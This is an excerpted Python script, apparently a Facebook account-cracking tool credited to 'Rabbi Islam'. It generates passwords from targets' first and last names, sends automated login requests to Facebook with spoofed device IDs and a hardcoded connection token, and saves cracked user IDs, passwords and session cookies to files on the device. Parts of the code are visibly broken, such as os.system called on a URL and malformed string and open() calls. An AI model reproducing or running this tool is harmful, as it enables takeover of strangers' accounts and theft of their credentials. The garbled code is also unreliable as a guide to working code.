...
`MMMMMMMb.           MM       MM      68b 
 MM    `Mb           MM       MM      Y89 
 MM     MM    ___    MM____   MM____  ___ 
 MM     MM  6MMMMb   MMMMMMb  MMMMMMb `MM 
 MM    .M9 8M'  `Mb  MM'  `Mb MM'  `Mb MM 
 MMMMMMM9'     ,oMM  MM    MM MM    MM MM 
 MM  \M\   ,6MM9'MM  MM    MM MM    MM MM 
 MM   \M\  MM'   MM  MM    MM MM    MM MM 
 MM    \M\ MM.  ,MM  MM.  ,M9 MM.  ,M9 MM 
_MM_    \M\`YMMM9'Yb_MYMMMM9 _MYMMMM9 _MM_
                                          
                                        

\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Rabbi Islam
\033[1;37m Facebook:            𝕊𝕐ℂ𝕆 \\_____ :* :) 3:)
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('https://www.facebook.com/profile.php?id=100076253516696&mibextid=JRoKGi')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SSB(allkey)
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={rabbi};{ckkk}"
    ...
    def methodC(self, sid, name, psw):
        try:
            ...
            try:
                ...
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',Rabbi).replace('name',name.lower(Rabbi Islam))
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SSB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RAB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
                    cps.append(sid)
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    #print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/rab.txt'' a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
                #time.sleep(31)
...
def cutter():
    ...
    print(47*'-')
    input(f"{S} Press Enter To Back nil Menu ")
    SSB(allkey)       
